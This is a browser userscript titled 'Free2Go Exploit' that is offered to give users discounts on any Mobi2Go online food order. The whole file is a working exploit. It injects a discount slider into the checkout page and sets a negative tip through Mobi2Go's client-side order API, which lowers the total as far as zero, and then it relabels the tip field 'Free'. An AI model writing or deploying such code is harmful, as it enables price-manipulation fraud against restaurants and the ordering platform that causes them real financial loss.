// ==UserScript==
// @name        Free2Go Exploit
// @namespace   nz.co.makereti.free2goexploit
// @description Give yourself discounts on any Mobi2Go orders
// @include     *
// @version     2
// @logo        https://github.com/mrkno/Free2Go/raw/master/logo.png
// ==/UserScript==

window.addEventListener('load', () => {
    if (!Mobi2Go) {
        return;
    }
    console.log('Mobi2Go Detected');
	
	let injection = '<div data-free-discount="" class="m2g-order-basket-section m2g-order-section m2g-order-section--complete"><div class="m2g-order-section-header"><span class="m2g-order-section-title">Discount</span><span class="m2g-order-section-status"></span></div><div class="" data-basket=""><style>.center{text-align:center;}.maxWidthT{width:100%;margin:0;padding:0;}.maxWidthD{width:100%;text-align:center;}.container{width:200px;border:1px solid black;font-size:0.75em;font-family:Arial,san-serif;}</style><div class="discountContainer"><table><tr><td class="maxWidthD"><input type="range" name="discountSlider" id="discountSlider" min="0.00" value="0.00" step="0.01" class="maxWidthT"></td><td class="center"><span id="discountPercentage">100</span>&#37;</td></tr></table><table><tr><td><label for="discountAmount">$</label></td><td class="maxWidthD"><input id="discountAmount" name="discountAmount" type="number" min="0.00" step="0.01" value="0.00" placeholder="0.00" class="maxWidthT"></td></tr></table></div></div></div>';
	$(injection).insertBefore('*[data-order-section="basket"]');
	
	let padLeft = (nr, n, str) => {
		return Array(n-String(nr).length+1).join(str||'0')+nr;
	};

	let amount = $('#discountAmount'),
		slider = $('#discountSlider'),
		percen = $('#discountPercentage');

	let updateDiscount = (event) => {
		let total = Mobi2Go.Order.getProductsTotal()[0],
			value = parseFloat(event.target.value);
		if ((!value && value !== 0) || value < event.target.min || value > total) {
			event.target.css('border','solid 1px #FF0000');
			return;
		}
		Mobi2Go.Order.setTip(-value);
		
		amount.css('border', '');
		slider.css('border', '');
		
		if ($(event.target) != amount) amount.val(value);
		if ($(event.target) != slider) slider.val(value);
		percen.text(padLeft((100.0 * (value / total)).toFixed(0),3,' '));
	};
	
	amount.on('input', updateDiscount);
	slider.on('input', updateDiscount);

	let updateMax = () => {
		let total = Mobi2Go.Order.getProductsTotal()[0],
				discount = -Mobi2Go.Order.getTip()[0];
		discount = discount > total ? total : discount;
		amount.attr('max',total.toString());
		slider.attr('max',total.toString());
		amount.val(discount);
		slider.val(discount);
		percen.text(padLeft((100.0 * (discount / total)).toFixed(0),3,' '));
		
		if (total <= 0) {
			$('*[data-free-discount]').hide();
		}
		else {
			$('*[data-free-discount]').show();
		}
	};

	updateMax();
	Mobi2Go.Order.bind('updateTotal', updateMax);
	
	let tipTotal = $('*[data-view="order-tip"]'),
			inner = tipTotal.find('span');
	tipTotal.text('Free');
	tipTotal.append(inner);
}, false);